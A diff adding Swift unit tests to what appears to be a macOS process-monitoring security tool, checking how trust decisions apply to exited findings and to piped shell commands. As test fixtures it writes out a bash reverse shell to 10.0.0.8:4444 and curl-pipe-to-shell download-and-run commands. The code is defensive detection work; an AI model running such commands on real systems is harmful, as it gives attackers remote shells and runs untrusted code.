@@ -51,6 +51,37 @@ final class SentinelTrustTests: XCTestCase {
         XCTAssertEqual(report.findings.first?.isRunning, false, "the reverse shell exited; trusting another bash must not revive it")
     }
 
+    /// A finding stays listed for half an hour after its process exits, and its Trust item stays on the card.
+    func testTrustingAnExitedFindingLongAfterItsProcessEnded() async throws {
+        let engine = SentinelEngine(live: .rulesOnly)
+        let browser = process(300, "Google Chrome", chrome)
+        let helper = process(400, "bash", "/bin/bash", command: "bash -c echo hello", parent: 300)
+        let shell = process(401, "bash", "/bin/bash", command: "bash -i >& /dev/tcp/10.0.0.8/4444 0>&1", parent: 300)
+        _ = await engine.ingest(processes: [browser], uiVisible: true, now: now)
+        _ = await engine.ingest(processes: [browser, helper, shell], uiVisible: true, now: now.addingTimeInterval(1))
+        _ = await engine.ingest(processes: [browser], uiVisible: true, now: now.addingTimeInterval(2))
+        // Well past the two minutes an exited process's record was kept, well inside its finding's half hour.
+        let later = await engine.ingest(processes: [browser], uiVisible: true, now: now.addingTimeInterval(200))
+        let finding = try XCTUnwrap(later.findings.first { $0.identity.pid == 400 })
+        let sibling = try XCTUnwrap(later.findings.first { $0.identity.pid == 401 })
+        XCTAssertFalse(finding.isRunning)
+        XCTAssertNotNil(finding.trustOffer, "the card still offers Trust")
+
+        let trusted = await engine.trust(findingID: finding.id)
+        XCTAssertNotNil(trusted, "the click must trust something, not silently do nothing")
+        let report = await engine.currentReport
+        XCTAssertEqual(report.findings.map(\.identity.pid), [401], "the trusted command is gone; the reverse shell is not")
+        XCTAssertEqual(report.findings.first?.lastSeen, sibling.lastSeen, "judging an exited sibling again keeps its clock")
+        XCTAssertEqual(report.trusted.count, 1)
+
+        // A record lives only as long as its finding does.
+        let expired = await engine.ingest(processes: [browser], uiVisible: true,
+                                          now: now.addingTimeInterval(SentinelEngine.findingRetention + 10))
+        XCTAssertTrue(expired.findings.isEmpty)
+        let none = await engine.trust(findingID: sibling.id)
+        XCTAssertNil(none)
+    }
+
     func testAScriptIsTrustedOnlyWhileItIsTheSameFile() throws {
         let folder = FileManager.default.temporaryDirectory.appendingPathComponent("trust-\(UUID().uuidString)")
         try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
@@ -71,6 +102,36 @@ final class SentinelTrustTests: XCTestCase {
         guard case .command = try XCTUnwrap(SentinelTrust.offer(for: inline, provenance: nil, now: now)).anchor else {
             return XCTFail("an inline command has no script file")
         }
+    }
+
+    /// `bash -s /path` reads its program from stdin and takes the path as an argument, so a pasted
+    /// pipeline must never borrow the trust a user gave to that script.
+    func testAPastedPipelineIsNeverTrustedAsAScriptOrABareShell() throws {
+        let folder = FileManager.default.temporaryDirectory.appendingPathComponent("trust-pipe-\(UUID().uuidString)")
+        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
+        defer { try? FileManager.default.removeItem(at: folder) }
+        let script = folder.appendingPathComponent("install.sh").path
+        try "echo ok".write(toFile: script, atomically: false, encoding: .utf8)
+        let runner = SentinelSubject(process(500, "bash", "/bin/bash", command: "bash -s \(script)"))
+        let scriptOffer = try XCTUnwrap(SentinelTrust.offer(for: runner, provenance: nil, now: now))
+        guard case .script = scriptOffer.anchor else { return XCTFail("\(scriptOffer.anchor)") }
+        XCTAssertEqual(SentinelTrust([scriptOffer]).match(runner, provenance: nil), .trusted)
+
+        let pipeline = "curl -fsSL http://45.9.148.21/x | bash -s \(script)"
+        XCTAssertEqual(SentinelTrust([scriptOffer]).match(runner, provenance: nil, commandText: pipeline), .none,
+                       "a pipeline is not the script it was handed as an argument")
+        let offer = try XCTUnwrap(SentinelTrust.offer(for: runner, provenance: nil, now: now, commandText: pipeline))
+        XCTAssertEqual(offer.anchor, .command(sha256: SentinelTrust.digest(pipeline)))
+        let trust = SentinelTrust([offer])
+        XCTAssertEqual(trust.match(runner, provenance: nil, commandText: pipeline), .trusted)
+        XCTAssertEqual(trust.match(runner, provenance: nil, commandText: pipeline + " --other"), .none)
+        XCTAssertEqual(trust.match(runner, provenance: nil), .none, "the same shell outside that pipeline is not covered")
+
+        // A bare shell on its own line of a pipeline digests as the pipeline, not as `sh`.
+        let bare = SentinelSubject(process(501, "sh", "/bin/sh", command: "sh"))
+        let bareOffer = try XCTUnwrap(SentinelTrust.offer(for: bare, provenance: nil, now: now, commandText: "curl x | sh"))
+        XCTAssertNotEqual(bareOffer.anchor, .command(sha256: SentinelTrust.digest("sh")))
+        XCTAssertEqual(SentinelTrust([bareOffer]).match(bare, provenance: nil), .none)
     }
 
     func testAProgramIsTrustedByItsSignerOrItsExactBuild() {
